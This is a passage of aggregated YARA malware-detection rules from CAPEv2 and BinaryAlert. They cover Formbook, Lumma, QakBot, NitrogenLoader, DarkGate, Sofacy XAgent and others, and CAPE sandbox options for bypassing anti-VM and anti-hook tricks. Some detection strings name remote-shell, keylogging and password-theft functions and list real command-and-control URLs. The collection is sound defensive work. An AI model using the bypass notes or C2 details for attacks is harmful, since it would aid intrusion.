		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "b0aa4cec55a21245d8104380c531dd6cc0fdef64fbefd79616eadfb4e95b2d75"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,bp0=$c2,action0=string:rcx+1,bp1=$decoy+67,action1=string:rcx+1,count=0,typestring=Formbook Config"
		packed = "b8e44f4a0d92297c5bb5b217c121f0d032850b38749044face2b0014e789adfb"

	strings:
		$c2 = {44 8B C6 48 8B D3 49 8B CE E8 [4] 44 88 23 41 8B DD 48 8D [2] 66 66 66 0F 1F 84 00 00 00 00 00 BA 8D 00 00 00 41 FF C4}
		$decoy = {8B D7 0F 1F 44 00 00 0F B6 03 FF C0 48 98 48 03 D8 48 FF CA 75 ?? 44 0F B6 03 48 8D 53 01 48 8D 4C [2] E8}

	condition:
		all of them
}

rule CAPE_Formhelper
{
	meta:
		description = "Formbook Config Extraction"
		author = "kevoreilly"
		id = "88ff1354-1ae7-5380-a586-ef95212d59df"
		date = "2025-06-13"
		modified = "2025-06-13"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/Formbook.yar#L46-L58"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "77cdfc94aac089c4f2590f4afbab35351fc6e104e67813548c68c59d27019a63"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,bp2=$config,action2=scan,count=0"
		packed = "0270016f451f9ba630f2ea4e2ea006fb89356627835b560bb2f4551a735ba0e1"

	strings:
		$config = {40 55 53 56 57 41 54 41 55 41 56 41 57 48 8D AC 24 [4] 48 81 EC [2] 00 00 45 33 ?? 33 C0 4C 8B E9 4C 89}
		$decode = {66 66 66 66 0F 1F 84 00 00 00 00 00 0F B6 41 01 48 FF C9 28 41 01 49 FF C9}

	condition:
		all of them
}

rule CAPE_Formconfb
{
	meta:
		description = "Formbook Config Extraction"
		author = "kevoreilly"
		id = "a91cd10e-c043-556a-819b-c57bfc308260"
		date = "2025-06-13"
		modified = "2025-06-13"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/Formbook.yar#L60-L75"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "bb8f54220394420e698b5eac9276c3d0ab03148808cfb9e98feb56437ce2a5a7"
		score = 75
		quality = 70
		tags = ""
		cape_options = "clear,bp0=$c2_1,bp0=$c2_2,action0=string:rcx,bp1=$decoy,action1=string:rdi,bp2=$config,action2=scan,bp3=$sleep+5,action3=skip,count=0,typestring=Formbook Config"
		packed = "60571b2683e7b753a77029ebe9b5e1cb9f3fbfa8d6a43e4b7239eefd13141ae4"

	strings:
		$c2_1 = {44 0F B6 5D ?? 45 84 DB 74 ?? 48 8D 4D [1-5] 41 80 FB 2F 74 11 0F B6 41 01 48 FF C1 FF C3 44 0F B6 D8 84 C0 75}
		$c2_2 = {40 53 48 83 EC 20 48 8B DA 48 85 C9 74 28 80 39 00 74 23 48 85 D2 74 1E 48 8B D1 41 B8 04 00 00 00 48 8B CB E8}
		$decoy = {45 3B B5 [2] 00 00 [0-7] 44 8D 1C 33 48 8D 7D [1-5] 42 C6 44 [2] 00 [0-4] 48 8B CF E8}
		$config = {40 55 53 56 57 41 54 41 55 41 56 41 57 48 8D AC 24 [4] 48 81 EC [2] 00 00 45 33 F6 33 C0 4C 8B E9 4C 89 75}
		$sleep = {B9 88 13 00 00 FF D7 44 8B 9B [4] 41 81 FB 00 01 00 00 75 ?? 48 39 B3 [4] 74 ?? 8B 83 [4] 05 00 20 00 00 39 B0}

	condition:
		2 of them
}

rule CAPE_Lummaremap
{
	meta:
		description = "Lumma ntdll-remap bypass"
		author = "kevoreilly"
		id = "93ae37d1-a38a-5f96-8bb3-cc648a49b588"
		date = "2024-05-09"
		modified = "2024-05-09"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/Lumma.yar#L16-L27"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "51093379fbd041f75bdfe161bc9dfcc7d782c23ce16d625ca558bb58d8d57713"
		score = 75
		quality = 70
		tags = ""
		cape_options = "ntdll-remap=0"
		packed = "7972cbf2c143cea3f90f4d8a9ed3d39ac13980adfdcf8ff766b574e2bbcef1b4"

	strings:
		$remap = {C6 44 24 20 00 C7 44 24 1C C2 00 00 90 C7 44 24 18 00 00 FF D2 C7 44 24 14 00 BA 00 00 C7 44 24 10 B8 00 00 00 8B ?? 89 44 24 11}

	condition:
		any of them
}

rule CAPE_Slowloader
{
	meta:
		description = "SlowLoader detonation aide for slow cpus (thread race)"
		author = "kevoreilly"
		id = "05724bf4-b767-542d-a2dd-a9ae3e5ea5cc"
		date = "2024-09-23"
		modified = "2024-09-23"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/SlowLoader.yar#L1-L12"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "f07528c646ebd980a5e843caa4a4715e31b22c3cd091576600e9fe45d7fc2fe4"
		score = 75
		quality = 70
		tags = ""
		cape_options = "break-on-return=CreateProcessA,action0=sleep:1000,count=0"
		packed = "f6eeb73ffb3e6d6cc48f74344cb590614db7e3116ba00a52aefd7dff468a60a5"

	strings:
		$code = {0F B6 44 07 08 0F B6 54 1F 08 03 C2 25 FF 00 00 80 79 07 48 0D 00 FF FF FF 40 89 45 ?? 6A 00}

	condition:
		any of them
}

rule CAPE_Rhadamanthys_1
{
	meta:
		description = "No description has been set in the source file - CAPE"
		author = "kevoreilly"
		id = "d9d387e1-76b3-55f6-a40f-a8c9cb9e9bea"
		date = "2023-04-18"
		modified = "2023-04-18"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/Rhadamanthys.yar#L1-L13"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "3c8fbfe14f81e099fc900023d9c856e3f45b99af38889ed952b2ac67a636f51d"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$conf-11,hc0=1,action0=setdump:edx::ebx,bp1=$conf+64,hc1=1,action1=dump,count=0,typestring=Rhadamanthys Config,ntdll-protect=0"
		packed = "9e28586ab70b1abdccfe087d81e326a0703f75e9551ced187d37c51130ad02f5"

	strings:
		$rc4 = {88 4C 01 08 41 81 F9 00 01 00 00 7C F3 89 75 08 33 FF 8B 4D 08 3B 4D 10 72 04 83 65 08 00}
		$code = {8B 4D FC 3B CF 8B C1 74 0D 83 78 04 02 74 1C 8B 40 1C 3B C7 75 F3 3B CF 8B C1 74 57 83 78 04 17 74 09 8B 40 1C 3B C7 75 F3 EB}
		$conf = {46 BB FF 00 00 00 23 F3 0F B6 44 31 08 03 F8 23 FB 0F B6 5C 39 08 88 5C 31 08 88 44 39 08 02 C3 8B 5D 08 0F B6 C0 8A 44 08 08}

	condition:
		2 of them
}

rule CAPE_Qakbotantivm
{
	meta:
		description = "QakBot AntiVM bypass"
		author = "kevoreilly"
		id = "7446522a-788a-512d-ad68-2fcc56169f5a"
		date = "2024-02-16"
		modified = "2024-02-16"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/QakBot.yar#L48-L59"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "e269497ce458b21c8427b3f6f6594a25d583490930af2d3395cb013b20d08ff7"
		logic_hash = "20f1cd28f38945a3aa328e77e78525fb1ffc47ecf54d5a40c2f18264c3973989"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$antivm1,action0=unwind,count=1"

	strings:
		$antivm1 = {55 8B EC 3A E4 0F [2] 00 00 00 6A 04 58 3A E4 0F [2] 00 00 00 C7 44 01 [5] 81 44 01 [5] 66 3B FF 74 ?? 6A 04 58 66 3B ED 0F [2] 00 00 00 C7 44 01 [5] 81 6C 01 [5] EB}

	condition:
		all of them
}

rule CAPE_Xworm_1
{
	meta:
		description = "XWorm Config Extractor"
		author = "kevoreilly"
		id = "0f55dbfb-c239-53f2-a1e0-bfa494558d6e"
		date = "2023-11-07"
		modified = "2023-11-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/XWorm.yar#L1-L11"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "d8e103f3470e83d71cd4992b74698c0721b8a69d764fdb7a4543997b2853014a"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$decrypt+11,action0=string:r10,count=1,typestring=XWorm Config"

	strings:
		$decrypt = {45 33 C0 39 09 FF 15 [4] 48 8B F0 E8 [4] 48 8B C8 48 8B D6 48 8B 00 48 8B 40 68 FF 50 ?? 90}

	condition:
		any of them
}

rule CAPE_Agentteslav3Jit
{
	meta:
		description = "AgentTesla V3 JIT native string decryption"
		author = "ClaudioWayne"
		id = "590c5058-c1db-5366-8db5-57449a178999"
		date = "2024-02-27"
		modified = "2024-02-27"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/AgentTesla.yar#L16-L26"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "62a49cf4295df637f96ba7c127cfc4aeb9af2fcced497fdf34d726a062edc1ec"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$decode+20,count=0,action0=string:eax+8,typestring=AgentTesla Strings,no-logs=2"

	strings:
		$decode = {8B C8 57 FF 75 08 8B [5] 8B 01 8B 40 3C FF [2] 8B F0 B8 03 00 00 00}

	condition:
		all of them
}

rule CAPE_Bumblebeeshellcode_1
{
	meta:
		description = "BumbleBee Loader 2023"
		author = "kevoreilly"
		id = "20dd4668-497d-5f37-a61e-c154209503b8"
		date = "2023-02-08"
		modified = "2023-02-08"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/BumbleBee.yar#L18-L32"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "865510868ee7c089c2ada0645098e851ca2bb9084a74315ce16296eb19c93ab4"
		score = 75
		quality = 70
		tags = ""
		cape_options = "coverage-modules=gdiplus,ntdll-protect=0"
		packed = "51bb71bd446bd7fc03cc1234fcc3f489f10db44e312c9ce619b937fad6912656"

	strings:
		$setpath = "setPath"
		$alloc = {B8 01 00 00 00 48 6B C0 08 48 8D 0D [2] 00 00 48 03 C8 48 8B C1 48 89 [3] 00 00 00 8B 44 [2] 05 FF 0F 00 00 25 00 F0 FF FF 8B C0 48 89}
		$hook = {48 85 C9 74 20 48 85 D2 74 1B 4C 8B C9 45 85 C0 74 13 48 2B D1 42 8A 04 0A 41 88 01 49 FF C1 41 83 E8 01 75 F0 48 8B C1 C3}
		$algo = {41 8B C1 C1 E8 0B 0F AF C2 44 3B C0 73 6A 4C 8B [3] 44 8B C8 B8 00 08 00 00 2B C2 C1 E8 05 66 03 C2 8B 94 [2] 00 00 00}

	condition:
		2 of them
}

rule CAPE_Gettickcountantivm
{
	meta:
		description = "GetTickCountAntiVM bypass"
		author = "kevoreilly"
		id = "d90b9768-0525-5963-9817-e3a53b1d4cf3"
		date = "2022-02-25"
		modified = "2022-02-25"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/GetTickCountAntiVM.yar#L1-L20"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		hash = "662bc7839ed7ddd82d5fdafa29fafd9a9ec299c28820fe4104fbba9be1a09c42"
		hash = "00f1537b13933762e1146e41f3bac668123fac7eacd0aa1f7be0aa37a91ef3ce"
		hash = "549bca48d0bac94b6a1e6eb36647cd007fed5c0e75a0e4aa315ceabdafe46541"
		hash = "90c29a66209be554dfbd2740f6a54d12616da35d0e5e4af97eb2376b9d053457"
		logic_hash = "9cdb0b2d2e058e1858c2f2baad67005a2019fbbdcb7ca54571c8d20dfbf33471"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$antivm1-13,bp0=$antivm5-40,bp0=$antivm6,action0=wret,hc0=1,bp1=$antivm2-6,action1=wret,hc1=1,count=1,bp2=$antivm3+42,action2=jmp:96,bp3=$antivm4-9,action3=wret,hc3=1"

	strings:
		$antivm1 = {57 FF D6 FF D6 BF 01 00 00 00 FF D6 F2 0F 10 0D [4] 47 66 0F 6E C7 F3 0F E6 C0 66 0F 2F C8 73}
		$antivm2 = {F2 0F 11 45 ?? FF 15 [4] 6A 00 68 10 27 00 00 52 50 E8 [4] 8B C8 E8 [4] F2 0F 59 45}
		$antivm3 = {0F 57 C0 E8 [4] 8B 35 [4] BF 01 00 00 00 FF D6 F2 0F 10 0D [4] 47 66 0F 6E C7 F3 0F E6 C0 66 0F 2F C8 73}
		$antivm4 = {F2 0F 11 45 EC FF 15 [4] 8B DA 8B C8 BA [4] 89 5D FC F7 E2 BF [4] 89 45 F4 8B F2 8B C1 B9}
		$antivm5 = {BB 01 00 00 00 8B FB 90 FF 15 [4] FF C7 66 0F 6E C7 F3 0F E6 C0 66 0F 2F F8 73 EA}
		$antivm6 = {48 81 EC 88 00 00 00 0F 57 C0 F2 0F 11 44 [2] F2 0F 10 05 [4] F2 0F 11 44 [2] F2 0F 10 05 [4] F2 0F 11}

	condition:
		any of them
}

rule CAPE_Icedidhook
{
	meta:
		description = "IcedID hook fix"
		author = "kevoreilly"
		id = "011c9cb7-8080-5f8a-9dca-6397e9bf7bf6"
		date = "2023-11-28"
		modified = "2023-11-28"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/IcedID.yar#L15-L25"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "fd62e0ed6f2a18472fa9336daee0e8a3a55e21779a8385394e85f96da928e24f"
		score = 75
		quality = 70
		tags = ""
		cape_options = "ntdll-protect=0"

	strings:
		$hook = {C6 06 E9 83 E8 05 89 46 01 8D 45 ?? 50 FF 75 ?? 6A 05 56 6A FF E8 2D FA FF FF}

	condition:
		any of them
}

rule CAPE_Vbcrypter
{
	meta:
		description = "VBCrypter anti-hook Bypass"
		author = "kevoreilly"
		id = "2e010dfd-5096-5e81-af9b-174322a47d87"
		date = "2021-03-28"
		modified = "2021-03-28"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/VBCrypter.yar#L1-L11"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "a62bca62ab624ab1a2c2e612c5b7e6d543006026a49c07c46800499e31e41c4e"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$antihook-12,action0=jmp,count=0"

	strings:
		$antihook = {43 39 C3 0F 84 ?? 00 00 00 80 3B B8 75 ?? 83 7B 01 00 75 ?? 80 7B 05 BA 75 ?? 8B 53 06 83 C3 0A 31 C9}

	condition:
		any of them
}

rule CAPE_Singlestepantihook
{
	meta:
		description = "Single-step anti-hook Bypass"
		author = "kevoreilly"
		id = "f7aca40b-d231-543b-81f3-5f4524abab78"
		date = "2021-08-26"
		modified = "2021-08-26"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/SingleStepAntiHook.yar#L1-L11"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "fc9f36b0ecc13192fe8b6caaff256ac52c1f14480223d629a38ba84e90dd0809"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$antihook+6,action0=skip,count=0"

	strings:
		$antihook = {FF D? 83 EC 08 9C 81 0C 24 00 01 00 00 9D}

	condition:
		any of them
}

rule CAPE_Loadersyscall
{
	meta:
		description = "Loader Syscall"
		author = "enzok"
		id = "45193b38-938e-55cf-9ea0-7bd48f0d77e4"
		date = "2025-06-26"
		modified = "2025-06-26"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/NitrogenLoader.yar#L1-L13"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "3c7ffd8b95032cffecff7fa7e5f5f561cce13e1109f6a9b30bc743642b495e45"
		score = 75
		quality = 70
		tags = ""
		cape_options = "sysbp=$syscall*-2,count=0"

	strings:
		$makehashes = {48 89 4C 24 ?? 48 89 54 24 ?? 4? 89 44 24 ?? 4? 89 4C 24 ?? 4? 83 EC ?? B? [4] E8 [3] 00}
		$number = {49 89 C3 B? [4] E8 [3] 00}
		$syscall = {48 83 C4 ?? 4? 8B 4C 24 ?? 4? 8B 54 24 ?? 4? 8B 44 24 ?? 4? 8B 4C 24 ?? 4? 89 CA 4? FF E3}

	condition:
		all of them
}

rule CAPE_Nitrogenloaderaes
{
	meta:
		description = "NitrogenLoader AES and IV"
		author = "enzok"
		id = "c79a00af-52f9-5f07-9c58-e8964e70986f"
		date = "2025-06-26"
		modified = "2025-06-26"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/NitrogenLoader.yar#L15-L27"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "de8ed0e98948cfadfd579e334fd9ce9f777ddbd988de897529ba71cb5eb2d396"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$keyiv0+8,action0=dump:ecx::64,hc0=1,bp1=$keyiv0*-4,action1=dump:ecx::32,hc1=1,count=0"

	strings:
		$keyiv0 = {48 8B 8C 24 [4] E8 [3] 00 4? 89 84 24 [4] 4? 8B 84 24 [4] 4? 89 84 24 [4] 4? 8B 8C 24 [4] E8 [3] 00}
		$keyiv1 = {48 89 84 24 [4] 4? 8B 84 24 [4] 4? 8B 94 24 [4] 4? 8D 8C 24 [4] E8 [3] FF}
		$keyiv2 = {48 63 84 24 [4] 4? 8B C0 4? 8B 94 24 [4] 4? 8D 8C 24 [4] E8 [3] FF 4? 8B 84 24}

	condition:
		all of them
}

rule CAPE_Nitrogenloaderbypass
{
	meta:
		description = "Nitrogen Loader Exit Bypass"
		author = "enzok"
		id = "397b0b79-d569-5a71-bcac-ce0d64f706e6"
		date = "2025-06-26"
		modified = "2025-06-26"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/NitrogenLoader.yar#L29-L41"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "3a034d3ddd18723ea1f91814c8c2a2c47a749dfd1496a5d4777d8ff8bfab3457"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp2=$exit-2,action2=jmp,count=0"

	strings:
		$string1 = "LoadResource"
		$syscall = {48 83 C4 ?? 4? 8B 4C 24 ?? 4? 8B 54 24 ?? 4? 8B 44 24 ?? 4? 8B 4C 24 ?? 4? 89 CA 4? FF E3}
		$exit = {33 C9 E8 [4] E8 [4] 48 8D 84 24 [4] 48 89 44 24 ?? 4? B? E4 00 00 00 4? 8B 05 [4] B? 03 00 00 00 48 8D}

	condition:
		all of them
}

rule CAPE_Nitrogenloaderconfig
{
	meta:
		description = "NitrogenLoader Config Extraction"
		author = "enzok"
		id = "00de881d-6c50-54a6-9ba0-14204a6b54e9"
		date = "2025-06-26"
		modified = "2025-06-26"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/NitrogenLoader.yar#L43-L62"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "ecbba45cbff628eeba158049432c4a928ed2e1a26b5bcc242572ab54a270d04a"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$decrypt1*+1,bp1=$key*,hc0=1,count=0,action0=string:rcx,action1=string:rdx,typestring=NitrogenLoader Config"

	strings:
		$decrypt1 = {48 63 4? 24 ?? 33 D2 48 [0-3] F7 B4 24 [4] 48 8B C2 48 8B 8C 24 [4] 0F BE 04 01}
		$decrypt2 = {8B ?? 24 [1-4] 33 C8 8B C1 48 63 4C 24 ?? 48 8B 94 24 [4] 88 04 0A}
		$decrypt3 = {8B 8C 24 ?? ?? ?? ?? 2B C8 8B C1 48 63 4C 24 ?? 48 8B 94 24 [4] 88 04 0A}
		$key = {74 ?? E8 [4] 85 C0 75 ?? 4? 8B 0D [3] 00 4? 8D 15 [3] 00 E8}
		$taskman_1 = {E8 [4] B9 61 00 00 00 88 84 24 [4] E8 [4] B9 73 00 00 00 88 84 24 [4] E8 [4] B9 6B 00 00 00 88 84 24 [4] E8 [3] FF}
		$taskman_2 = {B9 4D 00 00 00 88 84 24 [4] E8 [4] B9 61 00 00 00 88 84 24 [4] E8 [4] B9 6E 00 00 00 88 84 24 [4] E8 [3] FF}
		$taskman_3 = {B9 61 00 00 00 88 84 24 [4] E8 [4] B9 67 00 00 00 88 84 24 [4] E8 [4] B9 65 00 00 00 88 84 24 [4] E8 [3] FF}
		$taskman_4 = {B9 72 00 00 00 88 84 24 [4] E8 [4] 31 C9 88 84 24 [4] E8 [3] FF}
		$rc4decrypt_1 = {48 89 ?? 48 89 ?? E8 [4] 48 8B ?? 24 [1-4] 4? 89 ?? 48 89 ?? 4? 89 C1 89 EA E8 [4] 48 89}
		$rc4decrypt_2 = {E8 [4] 8B ?? 24 [1-4] 4? 89 ?? 48 89 ?? 4? 89 C1 E8 [3] FF}

	condition:
		any of ( $decrypt* ) or ( $key and ( 3 of ( $taskman_* ) and 1 of ( $rc4decrypt_* ) ) )
}

rule CAPE_Darkgateloader
{
	meta:
		description = "DarkGate Loader"
		author = "enzok"
		id = "feb90ae6-ec01-59da-a3df-217df2133588"
		date = "2025-04-07"
		modified = "2025-04-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/analyzer/windows/data/yara/DarkGateLoader.yar#L1-L15"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3892929bec8fdca10f61a7974a9ab584da8963fd/LICENSE"
		logic_hash = "00692123615d2f7eaf8aea07754fc9439cf58e1fb8eb4f44f0428b362f27e794"
		score = 75
		quality = 70
		tags = ""
		cape_options = "bp0=$decrypt1+30,bp0=$decrypt2+29,action0=dump:eax::ebx,bp1=$decrypt3+80,action1=dumpsize:eax,bp2=$decrypt3+124,hc2=1,action2=dump:eax,count=0"
		packed = "b15e4b4fcd9f0d23d902d91af9cc4e01417c426e55f6e0b4ad7256f72ac0231a"

	strings:
		$loader = "loader"
		$decrypt1 = {B? 01 00 00 00 8B [3] E8 [4] 8B D7 32 54 [4] 88 54 18 FF 4? 4? 75}
		$decrypt2 = {B? 01 00 00 00 8B [2] E8 [4] 8B D7 2B D3 [4] 88 54 18 FF 4? 4? 75}
		$decrypt3 = {89 85 [4] 8B 85 [4] 8B F0 8D BD [4] B? 10 [3] F3 A5 8B 85 [4] 33 D2 [2] 8B 85 [4] 99}

	condition:
		$loader and any of ( $decrypt* )
}

rule BINARYALERT_Eicar_Av_Test
{
	meta:
		description = "This is a standard AV test, intended to verify that BinaryAlert is working correctly."
		author = "Austin Byers | Airbnb CSIRT"
		id = "4dbb9d9d-9a8b-56f0-878a-a4a362a2c4f8"
		date = "2018-04-17"
		modified = "2018-04-17"
		reference = "http://www.eicar.org/86-0-Intended-use.html"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/eicar.yara#L1-L18"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "870db233ca083fae19a88a109e13d086c76df2340b709eb2da565c08574a42bd"
		score = 50
		quality = 80
		tags = ""

	strings:
		$eicar_regex = /^X5O!P%@AP\[4\\PZX54\(P\^\)7CC\)7\}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H\+H\*\s*$/

rule BINARYALERT_Eicar_Substring_Test
{
	meta:
		description = "Standard AV test, checking for an EICAR substring"
		author = "Austin Byers | Airbnb CSIRT"
		id = "43af8d40-16be-5948-839e-b58cb36c4155"
		date = "2018-04-17"
		modified = "2018-04-17"
		reference = "https://github.com/airbnb/binaryalert/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/eicar.yara#L20-L34"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "9dc46b273d12d4431b833d4380235b387de4b3aab1f6211b868ada1d1339383a"
		score = 50
		quality = 40
		tags = ""

	strings:
		$eicar_substring = "$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"

	condition:
		all of them
}

rule BINARYALERT_Malware_Macos_Apt_Sofacy_Xagent
{
	meta:
		description = "sofacy xagent for macOS"
		author = "@mimeframe"
		id = "91bef771-2ef1-58f6-ae01-3bdde4cc003c"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://blog.malwarebytes.com/cybercrime/2017/03/two-new-mac-backdoors-discovered/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/malware/macos/malware_macos_apt_sofacy_xagent.yara#L3-L62"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "4fe4b9560e99e33dabca553e2eeee510"
		logic_hash = "d4b1096e4aeb8382e5abf93d3ecf71cd6ae2ed7afbc9a38549a2fc2739539674"
		score = 75
		quality = 55
		tags = ""

	strings:
		$a1 = "remoteShell" ascii wide
		$a2 = "getInfoOSX" ascii wide
		$a3 = "ftpUpload" ascii wide
		$a4 = "startUploading" ascii wide
		$a5 = "deleteFile:" ascii wide
		$a6 = "executeShellCommand" ascii wide
		$a7 = "getFirefoxPassword" ascii wide
		$a8 = "generateRandomPathAndName" ascii wide
		$a9 = "createCryptPacket" ascii wide
		$a10 = "CameraShot" ascii wide
		$a11 = "7Cryptor" ascii wide
		$a12 = "8ICryptor" ascii wide
		$a13 = "Keylogger" ascii wide
		$a14 = "BootXLoader" ascii wide
		$a15 = "InjectApp" ascii wide
		$b1 = "/Project/XAgentOSX/" ascii wide
		$b2 = "XLoader_OSX" fullword ascii wide
		$b3 = "<span class='keylog_user_keys'>" ascii wide
		$b4 = "<span class='keylog_process'>" ascii wide
		$b5 = "<span class='keylog_spec_key'>" ascii wide
		$b6 = "<font size=4 color=red><pre>Stop take screenshot</pre></font>" ascii wide
		$c1 = "http://23.227.196.215/" ascii wide
		$c2 = "http://apple-iclods.org/" ascii wide
		$c3 = "http://apple-checker.org/" ascii wide
		$c4 = "http://apple-uptoday.org/" ascii wide
		$c5 = "http://apple-search.info" ascii wide
		$d1 = "watch/?" fullword ascii wide
		$d2 = "search/?" fullword ascii wide
		$d3 = "find/?" fullword ascii wide
		$d4 = "results/?" fullword ascii wide
		$d5 = "open/?" fullword ascii wide
		$d6 = "search/?" fullword ascii wide
		$d7 = "close/?" fullword ascii wide
		$e1 = "itwm=" fullword ascii wide
		$e2 = "text=" fullword ascii wide
		$e3 = "from=" fullword ascii wide
		$e4 = "itwm=" fullword ascii wide
